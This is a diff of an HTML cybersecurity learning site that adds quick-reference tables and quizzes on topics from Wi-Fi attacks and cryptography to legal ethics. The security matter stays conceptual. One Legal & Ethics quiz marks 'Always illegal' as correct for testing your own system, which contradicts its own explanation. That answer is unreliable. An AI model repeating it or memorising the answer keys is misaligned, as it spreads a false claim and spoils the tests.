+    <tr><td><strong>WPS pin attack</strong></td><td>reaver bruteforces WPS PIN</td></tr>
+    <tr><td><strong>Bluetooth</strong></td><td>Pairing attacks, bluejacking</td></tr>
+    <tr><td><strong>WPA2</strong></td><td>AES-CCMP; WPA3 adds SAE</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Wi-Fi Security & Attacks</h3>
   <p>Wi-Fi protocols: <strong>WEP</strong> (broken — recover key in minutes), <strong>WPA</strong> (TKIP — vulnerable), <strong>WPA2</strong> (AES-CCMP — current standard), <strong>WPA3</strong> (SAE — resistant to offline attacks). Enterprise uses 802.1X with RADIUS.</p>
@@ -1873,11 +2721,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Protected Management Frames (802.11w) prevent deauthentication and disassociation attacks.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Why was WEP abandoned?</p>
+  <div class="q-opt" data-correct="false">A. Too fast</div>
+  <div class="q-opt" data-correct="true">B. Weak, predictable RC4 encryption</div>
+  <div class="q-opt" data-correct="false">C. No SSID support</div>
+  <div class="q-opt" data-correct="false">D. It required WPA3</div>
+  <div class="q-explain">WEP's 24-bit IVs and RC4 weakness allow cracking in minutes.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>WPA2 uses which encryption standard?</p>
+  <div class="q-opt" data-correct="false">A. DES</div>
+  <div class="q-opt" data-correct="true">B. AES-CCMP</div>
+  <div class="q-opt" data-correct="false">C. 3DES</div>
+  <div class="q-opt" data-correct="false">D. Blowfish</div>
+  <div class="q-explain">WPA2-AES with CCMP replaced the broken TKIP of WPA.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>An evil twin attack:</p>
+  <div class="q-opt" data-correct="false">A. Clones the DNS server</div>
+  <div class="q-opt" data-correct="true">B. Impersonates a legitimate access point</div>
+  <div class="q-opt" data-correct="false">C. Jams all signals</div>
+  <div class="q-opt" data-correct="false">D. Decrypts WPA2</div>
+  <div class="q-explain">The rogue AP uses the same SSID to intercept connections.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>A WPS PIN brute force targets:</p>
+  <div class="q-opt" data-correct="true">A. The 8-digit router PIN</div>
+  <div class="q-opt" data-correct="false">B. The WiFi password length</div>
+  <div class="q-opt" data-correct="false">C. MAC filtering</div>
+  <div class="q-opt" data-correct="false">D. Client certificates</div>
+  <div class="q-explain">WPS PINs (often 8 digits) are vulnerable to offline cracking.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-crypto" data-cat="Cryptography" data-title="Cryptography">
   <h1>Cryptography</h1>
   <p class="ssub">Understand encryption, hashing, PKI, and cryptographic attacks used in cybersecurity.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>Hashing</strong></td><td>One-way: SHA-256, MD5 (broken), bcrypt</td></tr>
+    <tr><td><strong>Symmetric</strong></td><td>Same key: AES-256, ChaCha20</td></tr>
+    <tr><td><strong>Asymmetric</strong></td><td>Key pair: RSA, ECC</td></tr>
+    <tr><td><strong>PKI</strong></td><td>Certificates + CAs + trust</td></tr>
+    <tr><td><strong>TLS handshake</strong></td><td>Hello -> Cert exchange -> Key exchange -> Encrypted</td></tr>
+    <tr><td><strong>Salt</strong></td><td>Adds randomness to password hashes</td></tr>
+    <tr><td><strong>HMAC</strong></td><td>Hash + secret key (integrity + auth)</td></tr>
+    <tr><td><strong>openssl</strong></td><td>genrsa, req, x509, s_client</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Symmetric & Asymmetric Encryption</h3>
   <p><strong>Symmetric</strong>: same key encrypt/decrypt. Fast: <strong>AES</strong> (128/192/256-bit, block cipher), <strong>ChaCha20</strong> (stream cipher). Key distribution is the challenge. <strong>DES</strong> (broken), <strong>3DES</strong> (deprecated).</p>
@@ -1943,11 +2841,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Rainbow tables use precomputed hash chains to quickly reverse hash functions, defeated by salting.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which is a cryptographic hash function?</p>
+  <div class="q-opt" data-correct="false">A. AES</div>
+  <div class="q-opt" data-correct="true">B. SHA-256</div>
+  <div class="q-opt" data-correct="false">C. RSA</div>
+  <div class="q-opt" data-correct="false">D. Diffie-Hellman</div>
+  <div class="q-explain">SHA-256 produces a fixed-size one-way digest; AES/RSA are ciphers.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>RSA is best described as:</p>
+  <div class="q-opt" data-correct="false">A. A hash</div>
+  <div class="q-opt" data-correct="true">B. An asymmetric cipher</div>
+  <div class="q-opt" data-correct="false">C. A block cipher only</div>
+  <div class="q-opt" data-correct="false">D. A MAC</div>
+  <div class="q-explain">RSA uses a public/private key pair — asymmetric cryptography.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>AES-256 is a:</p>
+  <div class="q-opt" data-correct="true">A. Symmetric block cipher</div>
+  <div class="q-opt" data-correct="false">B. Hash</div>
+  <div class="q-opt" data-correct="false">C. PKI standard</div>
+  <div class="q-opt" data-correct="false">D. Key exchange</div>
+  <div class="q-explain">AES uses the same key for encryption and decryption.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>HTTPS traffic is protected by:</p>
+  <div class="q-opt" data-correct="true">A. SSL certificates via TLS</div>
+  <div class="q-opt" data-correct="false">B. Hashing only</div>
+  <div class="q-opt" data-correct="false">C. Base64</div>
+  <div class="q-opt" data-correct="false">D. IPsec</div>
+  <div class="q-explain">TLS (with certificates) encrypts and authenticates HTTPS.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-cloud" data-cat="Cloud Security" data-title="Cloud & Container Security">
   <h1>Cloud & Container Security</h1>
   <p class="ssub">Master cloud security, container orchestration, serverless security, and cloud-native attacks.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>IAM</strong></td><td>Identity and Access Management (users/roles/policies)</td></tr>
+    <tr><td><strong>S3 misconfig</strong></td><td>Public buckets expose data</td></tr>
+    <tr><td><strong>Secrets</strong></td><td>Never hardcode keys; use secret managers</td></tr>
+    <tr><td><strong>Containers</strong></td><td>Share host kernel; escape = host compromise</td></tr>
+    <tr><td><strong>Kubernetes</strong></td><td>Orchestrator; RBAC + network policies</td></tr>
+    <tr><td><strong>Serverless</strong></td><td>Auto-scaling functions; check permissions</td></tr>
+    <tr><td><strong>Metadata service</strong></td><td>169.254.169.254 - SSRF target</td></tr>
+    <tr><td><strong>Benchmarks</strong></td><td>CIS AWS/Azure/GCP foundations</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">AWS/Azure/GCP Security Fundamentals</h3>
   <p><strong>AWS</strong>: IAM (users, roles, policies), Security Groups (stateful), NACLs (stateless), VPC (isolation), CloudTrail (audit logging), GuardDuty (threat detection). <strong>Shared responsibility model</strong>: cloud provider secures infrastructure, you secure data and configs.</p>
@@ -2013,11 +2961,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">IMDSv1 doesn't require a session token, making it vulnerable to SSRF attacks that steal IAM credentials.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>IAM in cloud computing manages:</p>
+  <div class="q-opt" data-correct="false">A. Container images</div>
+  <div class="q-opt" data-correct="true">B. Identities, roles, and permissions</div>
+  <div class="q-opt" data-correct="false">C. Virtual networks</div>
+  <div class="q-opt" data-correct="false">D. Billing only</div>
+  <div class="q-explain">IAM controls who can access which cloud resources and how.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>An open (public) S3 bucket can lead to:</p>
+  <div class="q-opt" data-correct="false">A. Faster uploads</div>
+  <div class="q-opt" data-correct="true">B. Exposure of sensitive data</div>
+  <div class="q-opt" data-correct="false">C. Lower costs</div>
+  <div class="q-opt" data-correct="false">D. Automatic patching</div>
+  <div class="q-explain">Misconfigured permissions expose stored objects to anyone.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Containers differ from VMs because they:</p>
+  <div class="q-opt" data-correct="false">A. Have their own kernel</div>
+  <div class="q-opt" data-correct="true">B. Share the host kernel</div>
+  <div class="q-opt" data-correct="false">C. Require hypervisors</div>
+  <div class="q-opt" data-correct="false">D. Use more RAM</div>
+  <div class="q-explain">Containers isolate processes but share the host OS kernel.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Serverless functions:</p>
+  <div class="q-opt" data-correct="false">A. Always run on dedicated VMs</div>
+  <div class="q-opt" data-correct="true">B. Auto-scale without managing servers</div>
+  <div class="q-opt" data-correct="false">C. Require SSH access</div>
+  <div class="q-opt" data-correct="false">D. Never touch the internet</div>
+  <div class="q-explain">Serverless (e.g. AWS Lambda) abstracts servers and scales automatically.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-mobile" data-cat="Mobile Security" data-title="Mobile Security">
   <h1>Mobile Security</h1>
   <p class="ssub">Mobile application security testing, Android/iOS exploitation, and mobile device management.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><code>adb devices</code></td><td>List connected Android devices</td></tr>
+    <tr><td><code>adb install app.apk</code></td><td>Install APK</td></tr>
+    <tr><td><code>adb shell</code></td><td>Interactive Android shell</td></tr>
+    <tr><td><strong>Jadx</strong></td><td>Decompile APK to Java</td></tr>
+    <tr><td><strong>Rooting</strong></td><td>Full control; enables deeper testing</td></tr>
+    <tr><td><strong>Jailbreak</strong></td><td>iOS equivalent</td></tr>
+    <tr><td><strong>Insecure storage</strong></td><td>Plaintext data in app files/databases</td></tr>
+    <tr><td><strong>ART</strong></td><td>Android Runtime - app sandbox per user</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Android Security & Exploitation</h3>
   <p>Android architecture: Linux kernel → HAL → Native libraries → Android Runtime → Framework → Applications. Security: SELinux, app sandboxing, permission model, verified boot, and Google Play Protect.</p>
@@ -2083,11 +3081,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">MDM (Mobile Device Management) provides enterprise control over mobile devices including policy enforcement and remote management.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Modern Android apps are sandboxed using:</p>
+  <div class="q-opt" data-correct="true">A. Per-app Linux user IDs</div>
+  <div class="q-opt" data-correct="false">B. IP addresses</div>
+  <div class="q-opt" data-correct="false">C. MAC filtering</div>
+  <div class="q-opt" data-correct="false">D. App Store review</div>
+  <div class="q-explain">Each app runs as a distinct Linux user, limiting access to others.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which is a common mobile app security flaw?</p>
+  <div class="q-opt" data-correct="false">A. Large icon files</div>
+  <div class="q-opt" data-correct="true">B. Storing secrets in plaintext</div>
+  <div class="q-opt" data-correct="false">C. Dark mode</div>
+  <div class="q-opt" data-correct="false">D. Push notifications</div>
+  <div class="q-explain">Insecure local storage leaks tokens and data to other apps/root users.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Rooting an Android device grants:</p>
+  <div class="q-opt" data-correct="false">A. App Store access</div>
+  <div class="q-opt" data-correct="true">B. Full filesystem and kernel control</div>
+  <div class="q-opt" data-correct="false">C. Better battery</div>
+  <div class="q-opt" data-correct="false">D. Guaranteed security</div>
+  <div class="q-explain">Root = unrestricted access, useful for analysis but risky.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>iOS apps are typically distributed through:</p>
+  <div class="q-opt" data-correct="false">A. Play Store</div>
+  <div class="q-opt" data-correct="true">B. The App Store</div>
+  <div class="q-opt" data-correct="false">C. APKs</div>
+  <div class="q-opt" data-correct="false">D. F-Droid</div>
+  <div class="q-explain">iOS uses the App Store; side-loading requires special channels.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-redteam" data-cat="Red Team" data-title="Red Team Operations">
   <h1>Red Team Operations</h1>
   <p class="ssub">Advanced adversary simulation, tactics, techniques, and procedures for red team engagements.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>MITRE ATT&CK</strong></td><td>Tactics/Techniques/Procedures framework</td></tr>
+    <tr><td><strong>Kill chain mapping</strong></td><td>Map attack to ATT&CK techniques</td></tr>
+    <tr><td><strong>C2</strong></td><td>Command & Control channel</td></tr>
+    <tr><td><strong>OPSEC</strong></td><td>Keep operations hidden: encrypt, blend traffic</td></tr>
+    <tr><td><strong>Adversary emulation</strong></td><td>Mimic a specific threat actor</td></tr>
+    <tr><td><strong>Purple team</strong></td><td>Red + Blue working together</td></tr>
+    <tr><td><strong>Deception</strong></td><td>Honeypots, canaries</td></tr>
+    <tr><td><strong>Engagement</strong></td><td>Time-boxed, goals defined upfront</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Red Team Planning & Execution</h3>
   <p>Red team engagements simulate real-world adversaries. <strong>Planning</strong>: define objectives (gain domain admin, exfiltrate data), scope (systems, techniques), and rules of engagement. Create a <strong>Threat Actor Profile</strong> to emulate specific TTPs.</p>
@@ -2153,11 +3201,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Vishing (voice phishing) uses phone calls to manipulate targets into revealing sensitive information.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>MITRE ATT&CK organizes adversary behavior into:</p>
+  <div class="q-opt" data-correct="false">A. CVSS scores</div>
+  <div class="q-opt" data-correct="true">B. Tactics and techniques</div>
+  <div class="q-opt" data-correct="false">C. Ranks and badges</div>
+  <div class="q-opt" data-correct="false">D. Log formats</div>
+  <div class="q-explain">ATT&CK maps techniques to tactics like Initial Access and Lateral Movement.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>TTP stands for:</p>
+  <div class="q-opt" data-correct="true">A. Tactics, Techniques, and Procedures</div>
+  <div class="q-opt" data-correct="false">B. Trust, Testing, and Patching</div>
+  <div class="q-opt" data-correct="false">C. Tools, Targets, and Payloads</div>
+  <div class="q-opt" data-correct="false">D. Time, Traffic, and Packets</div>
+  <div class="q-explain">TTPs describe how a threat actor operates.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Adversary emulation is based on:</p>
+  <div class="q-opt" data-correct="false">A. Random tools</div>
+  <div class="q-opt" data-correct="true">B. Real, documented threat actors</div>
+  <div class="q-opt" data-correct="false">C. Pen-test templates</div>
+  <div class="q-opt" data-correct="false">D. Firewall rules</div>
+  <div class="q-explain">Emulation mimics specific APT groups to test defenses realistically.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Poor OPSEC during an engagement can:</p>
+  <div class="q-opt" data-correct="false">A. Speed up reporting</div>
+  <div class="q-opt" data-correct="true">B. Expose the attacker's activity to defenders</div>
+  <div class="q-opt" data-correct="false">C. Guarantee success</div>
+  <div class="q-opt" data-correct="false">D. Skip permissions</div>
+  <div class="q-explain">OPSEC mistakes (C2 patterns, artifacts) reveal the operation.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-blueteam" data-cat="Blue Team" data-title="Blue Team & Defensive Security">
   <h1>Blue Team & Defensive Security</h1>
   <p class="ssub">Defensive security operations, threat detection, incident response, and security monitoring.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>SOC</strong></td><td>Security Operations Center</td></tr>
+    <tr><td><strong>SIEM</strong></td><td>Central log collection + alerting</td></tr>
+    <tr><td><strong>EDR</strong></td><td>Endpoint detection/response</td></tr>
+    <tr><td><strong>IR phases</strong></td><td>Preparation, Detection, Containment, Eradication, Recovery, Lessons</td></tr>
+    <tr><td><strong>Threat hunting</strong></td><td>Proactive hypothesis-driven search</td></tr>
+    <tr><td><strong>Playbooks</strong></td><td>Documented response procedures</td></tr>
+    <tr><td><strong>IOCs</strong></td><td>Indicators of Compromise: IPs, hashes, domains</td></tr>
+    <tr><td><strong>SOAR</strong></td><td>Automation of security operations</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Security Operations Center (SOC)</h3>
   <p>SOC tiers: <strong>Tier 1</strong> (alert triage, initial analysis), <strong>Tier 2</strong> (deep investigation, threat hunting), <strong>Tier 3</strong> (advanced analysis, malware reverse engineering). SOC analysts monitor SIEM, EDR, and network security tools.</p>
@@ -2223,11 +3321,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">MTTR (Mean Time to Remediate) measures the average time from vulnerability discovery to remediation.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>A SIEM provides:</p>
+  <div class="q-opt" data-correct="false">A. Firewall rules</div>
+  <div class="q-opt" data-correct="true">B. Centralized log collection and alerting</div>
+  <div class="q-opt" data-correct="false">C. Antivirus signatures</div>
+  <div class="q-opt" data-correct="false">D. Network cabling</div>
+  <div class="q-explain">SIEMs aggregate logs and raise alerts from correlated events.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>The first phase of incident response is:</p>
+  <div class="q-opt" data-correct="false">A. Recovery</div>
+  <div class="q-opt" data-correct="true">B. Preparation</div>
+  <div class="q-opt" data-correct="false">C. Containment</div>
+  <div class="q-opt" data-correct="false">D. Eradication</div>
+  <div class="q-explain">IR starts with preparation so teams can respond when incidents occur.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Threat hunting is best described as:</p>
+  <div class="q-opt" data-correct="false">A. Reactive ticket handling</div>
+  <div class="q-opt" data-correct="true">B. Proactively searching for hidden threats</div>
+  <div class="q-opt" data-correct="false">C. Installing firewalls</div>
+  <div class="q-opt" data-correct="false">D. Patching servers</div>
+  <div class="q-explain">Hunters form hypotheses and dig for signs of compromise beyond alerts.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which is a classic indicator of compromise?</p>
+  <div class="q-opt" data-correct="false">A. CPU temperature</div>
+  <div class="q-opt" data-correct="true">B. Unexpected outbound connections</div>
+  <div class="q-opt" data-correct="false">C. Monitor brightness</div>
+  <div class="q-opt" data-correct="false">D. Keyboard layout</div>
+  <div class="q-explain">Beaconing to unknown C2 IPs often signals compromise.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-homelab" data-cat="Home Lab" data-title="Home Lab & Practice">
   <h1>Home Lab & Practice</h1>
   <p class="ssub">Build a cybersecurity home lab with virtual machines, vulnerable machines, and practice environments.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>VirtualBox</strong></td><td>Free Type-2 hypervisor</td></tr>
+    <tr><td><strong>Proxmox</strong></td><td>Type-1 hypervisor + management</td></tr>
+    <tr><td><strong>Kali VM</strong></td><td>Attack workstation</td></tr>
+    <tr><td><strong>Parrot / Ubuntu</strong></td><td>Secondary VMs</td></tr>
+    <tr><td><strong>Snapshots</strong></td><td>Revert VMs to clean state</td></tr>
+    <tr><td><strong>Isolated network</strong></td><td>Host-only / NAT, no prod routing</td></tr>
+    <tr><td><strong>pfSense</strong></td><td>Free firewall/router VM</td></tr>
+    <tr><td><strong>Wordlists</strong></td><td>rockyou.txt, SecLists</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Lab Architecture & Setup</h3>
   <p>Minimum requirements: 16GB RAM (32GB recommended), 500GB SSD, CPU with virtualization support (Intel VT-x/AMD-V). <strong>VMware Workstation</strong> or <strong>VirtualBox</strong> (free) for virtualization.</p>
@@ -2293,11 +3441,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Vagrant provides reproducible VM environments using code, making lab setup consistent and shareable.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which free hypervisor is popular for home security labs?</p>
+  <div class="q-opt" data-correct="false">A. VMware ESXi (free tier)</div>
+  <div class="q-opt" data-correct="true">B. VirtualBox</div>
+  <div class="q-opt" data-correct="false">C. Hyper-V</div>
+  <div class="q-opt" data-correct="false">D. QEMU alone</div>
+  <div class="q-explain">VirtualBox runs Kali/Parrot VMs on any OS for free.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>VM snapshots let you:</p>
+  <div class="q-opt" data-correct="false">A. Speed up the internet</div>
+  <div class="q-opt" data-correct="true">B. Revert to a clean prior state</div>
+  <div class="q-opt" data-correct="false">C. Share RAM</div>
+  <div class="q-opt" data-correct="false">D. Encrypt the host</div>
+  <div class="q-explain">Snapshots restore a VM after destructive experiments.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>An isolated lab network should:</p>
+  <div class="q-opt" data-correct="false">A. Route to the production LAN</div>
+  <div class="q-opt" data-correct="true">B. Never route to your production network</div>
+  <div class="q-opt" data-correct="false">C. Use the public internet only</div>
+  <div class="q-opt" data-correct="false">D. Share DHCP with guests</div>
+  <div class="q-explain">Keep lab traffic off production to avoid accidents.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which platform manages multiple VMs with a web UI?</p>
+  <div class="q-opt" data-correct="true">A. Proxmox VE</div>
+  <div class="q-opt" data-correct="false">B. VirtualBox GUI</div>
+  <div class="q-opt" data-correct="false">C. GParted</div>
+  <div class="q-opt" data-correct="false">D. PuTTY</div>
+  <div class="q-explain">Proxmox VE is a Type-1 hypervisor with centralized management.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-career" data-cat="Career" data-title="Career & Certifications">
   <h1>Career & Certifications</h1>
   <p class="ssub">Navigate cybersecurity career paths, certifications, job hunting, and professional development.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>Entry certs</strong></td><td>CompTIA Security+, Network+</td></tr>
+    <tr><td><strong>Intermediate</strong></td><td>CEH, CySA+, SSCP</td></tr>
+    <tr><td><strong>Advanced offensive</strong></td><td>OSCP, OSCE, GPEN</td></tr>
+    <tr><td><strong>Advanced defense</strong></td><td>CISSP, GIAC, GCIH</td></tr>
+    <tr><td><strong>Skills</strong></td><td>Linux, networking, scripting (Python), cloud</td></tr>
+    <tr><td><strong>Practical</strong></td><td>TryHackMe, HackTheBox, bug bounties</td></tr>
+    <tr><td><strong>Resume</strong></td><td>Projects, labs, certs, measurable impact</td></tr>
+    <tr><td><strong>Roles</strong></td><td>SOC analyst, pentester, incident responder</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Career Paths & Specializations</h3>
   <p><strong>Defensive Security</strong>: SOC Analyst → Threat Hunter → Detection Engineer → Security Architect → CISO. <strong>Offensive Security</strong>: Junior Pen Tester → Senior Pen Tester → Red Team Lead → Principal Consultant.</p>
@@ -2363,11 +3561,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">The STAR method (Situation, Task, Action, Result) provides a structured way to answer behavioral interview questions.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which is the standard entry-level security certification?</p>
+  <div class="q-opt" data-correct="false">A. OSCP</div>
+  <div class="q-opt" data-correct="true">B. CompTIA Security+</div>
+  <div class="q-opt" data-correct="false">C. CISSP</div>
+  <div class="q-opt" data-correct="false">D. AWS SA</div>
+  <div class="q-explain">Security+ (Sec+) is the classic entry cert covering core security.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>A practical portfolio (CTF write-ups, labs) shows:</p>
+  <div class="q-opt" data-correct="false">A. Your typing speed</div>
+  <div class="q-opt" data-correct="true">B. Hands-on skill beyond certifications</div>
+  <div class="q-opt" data-correct="false">C. Social media presence</div>
+  <div class="q-opt" data-correct="false">D. Age</div>
+  <div class="q-explain">Employers value demonstrated, verifiable practical experience.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which certification is known as advanced offensive/pen-testing?</p>
+  <div class="q-opt" data-correct="false">A. CompTIA A+</div>
+  <div class="q-opt" data-correct="true">B. OSCP</div>
+  <div class="q-opt" data-correct="false">C. CISA</div>
+  <div class="q-opt" data-correct="false">D. PMP</div>
+  <div class="q-explain">OSCP requires a 24-hour hands-on lab and report — deeply practical.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Bug bounty programs help beginners by:</p>
+  <div class="q-opt" data-correct="false">A. Guaranteeing payment</div>
+  <div class="q-opt" data-correct="true">B. Providing real-world targets and feedback</div>
+  <div class="q-opt" data-correct="false">C. Replacing certifications</div>
+  <div class="q-opt" data-correct="false">D. Avoiding laws</div>
+  <div class="q-explain">They offer legal, real targets and reviewer feedback.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-legal" data-cat="Legal & Ethics" data-title="Legal & Ethics">
   <h1>Legal & Ethics</h1>
   <p class="ssub">Understand cybersecurity laws, regulations, ethical hacking guidelines, and professional responsibility.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>CFAA</strong></td><td>US law: unauthorized access is a crime</td></tr>
+    <tr><td><strong>GDPR</strong></td><td>EU data protection; breach disclosure</td></tr>
+    <tr><td><strong>Responsible disclosure</strong></td><td>Report to vendor, give time to fix</td></tr>
+    <tr><td><strong>Scope</strong></td><td>Only authorized targets</td></tr>
+    <tr><td><strong>Consent</strong></td><td>Always written permission</td></tr>
+    <tr><td><strong>HIPAA / PCI DSS</strong></td><td>Healthcare / payment data rules</td></tr>
+    <tr><td><strong>Hacking without permission</strong></td><td>Illegal even if "just exploring"</td></tr>
+    <tr><td><strong>Bug bounty TOS</strong></td><td>Follow the program rules exactly</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Cybersecurity Laws & Regulations</h3>
   <p><strong>CFAA</strong> (Computer Fraud and Abuse Act — US): criminalizes unauthorized access to computer systems. <strong>GDPR</strong> (EU): protects personal data, requires breach notification within 72 hours. <strong>HIPAA</strong>: protects healthcare information.</p>
@@ -2433,6 +3681,42 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">The (ISC)² Code of Ethics prioritizes protecting society above all other obligations.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>The US CFAA criminalizes:</p>
+  <div class="q-opt" data-correct="false">A. Writing exploits</div>
+  <div class="q-opt" data-correct="true">B. Unauthorized access to computer systems</div>
+  <div class="q-opt" data-correct="false">C. Using Kali Linux</div>
+  <div class="q-opt" data-correct="false">D. Reading about hacking</div>
+  <div class="q-explain">The Computer Fraud and Abuse Act punishes unauthorized access.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>GDPR primarily protects:</p>
+  <div class="q-opt" data-correct="false">A. Corporate trade secrets</div>
+  <div class="q-opt" data-correct="true">B. Personal data of EU individuals</div>
+  <div class="q-opt" data-correct="false">C. US government data</div>
+  <div class="q-opt" data-correct="false">D. Financial markets</div>
+  <div class="q-explain">GDPR gives EU residents rights over their personal data and mandates breach reporting.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Responsible disclosure requires the researcher to:</p>
+  <div class="q-opt" data-correct="false">A. Publish immediately</div>
+  <div class="q-opt" data-correct="true">B. Notify the vendor and allow time to fix</div>
+  <div class="q-opt" data-correct="false">C. Pay the vendor</div>
+  <div class="q-opt" data-correct="false">D. Disclose to the press first</div>
+  <div class="q-explain">Coordinated disclosure gives the vendor a window before public release.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Testing a system you own without anyone's permission is:</p>
+  <div class="q-opt" data-correct="true">A. Always illegal</div>
+  <div class="q-opt" data-correct="false">B. Legal because you own it</div>
+  <div class="q-opt" data-correct="false">C. Only legal if the device is registered</div>
+  <div class="q-opt" data-correct="false">D. Fine if you don't share results</div>
+  <div class="q-explain">Hacking others' systems is illegal; your own systems are your business.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-notes" data-cat="" data-title="My Notes">
@@ -2561,6 +3845,102 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
     </div>
   </div>
 </div>
+<div class="sc" id="sec-glossary" data-cat="Reference" data-title="Security Glossary">
+  <h1>Security Glossary</h1>
